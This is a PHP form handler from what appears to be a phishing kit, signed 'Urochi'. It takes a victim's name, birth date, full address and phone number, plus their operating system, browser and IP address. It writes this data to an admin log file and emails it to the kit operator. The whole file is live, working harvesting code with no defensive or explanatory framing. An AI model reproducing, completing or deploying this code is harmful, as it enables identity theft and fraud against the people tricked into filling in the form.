<?php

session_start();

include("system.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$Firstname = $_SESSION['Firstname'] = $_POST['Firstname'];
$LastName = $_SESSION['LastName'] = $_POST['LastName'];
$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$zipCod = $_SESSION['zipCod'] = $_POST['zipCod'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$msgbank = '


<html><head><title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
h2 {
display: block;
    font-size: 1em;
    margin-block-start: 0.4em;
    margin-block-end: -0.17em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
}
@media
only screen and (-webkit-min-device-pixel-ratio: 2),
only screen and (min--moz-device-pixel-ratio: 2),
only screen and (-moz-min-device-pixel-ratio: 2),
only screen and (-o-min-device-pixel-ratio: 2/1),
only screen and (min-device-pixel-ratio: 2),
only screen and (min-resolution: 192dpi),
only screen and (min-resolution: 2dppx) { 
}
.urotchi {
background-image: url("https://1.bp.blogspot.com/-gtBd267AYAs/XWEqQdmsT6I/AAAAAAAAAew/LY10ZNtvoFs12IEVJ1Fk2J2MIRwOcyh5QCPcBGAYYCw/s320/d4zrkfr.png");
background-position: center center;
background-repeat: no-repeat;
background-attachment: fixed;
background-size: contain;
}
.styllktnba {

   font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;
    font-size: 20px;
    font-weight: bold;
    color: #ffffff;
}
</style>
</head><body class="urotchi styllktnba" style="background-color: white;color: #000000;">
<div class="container w3-container">
<div class="">
<con>
  <h1 style="
    display: block;
    color: black;
    font-size: 1.5em;
    margin-block-start: -1em;
    margin-block-end: -1em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
">

<br>

</h1>
</con>
</div>
</div>
<br>
<div class="container w3-container">
<div class="w3-panel w3-border w3-light-grey w3-round-large" style="margin: 0 auto;width: 100%;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;max-width: 529px;border: 4px solid #e50914;border-radius: 5px;">
<div style="margin: 20px;">
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">billing Address</h2>
<h2>First name   : '.$_SESSION["Firstname"].' </h2>
<h2>Last Name    : '.$_SESSION["LastName"].' </h2>
<h2>birth date   : '.$_SESSION["birthdate"].' </h2>
<h2>addres       : '.$_SESSION["addres"].' </h2>
<h2>City         : '.$_SESSION["City"].' </h2>
<h2>State        : '.$_SESSION["State"].' </h2>
<h2>Zip Cod      : '.$_SESSION["zipCod"].' </h2>
<h2>phone Number : '.$_SESSION["phoneNumber"].' </h2>
<hr><h2>system : '.$OS.' </h2><h2>browser : '.$browserTy_Version.' </h2><h2>Ip Adress : '.$_SERVER["REMOTE_ADDR"].' </h2><h2>Date Time : '.$InfoDATE.' </h2>
</div></div>
</div>
</body></html>';



include("sand_email.php"); 


$f = fopen("../../adminpanel.php", "a");
	fwrite($f, $msgbank);

$yourmail.=$vvr ;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: Urochi" . "\r\n";

mail($yourmail, $subject, $msgbank, $headers);




?>



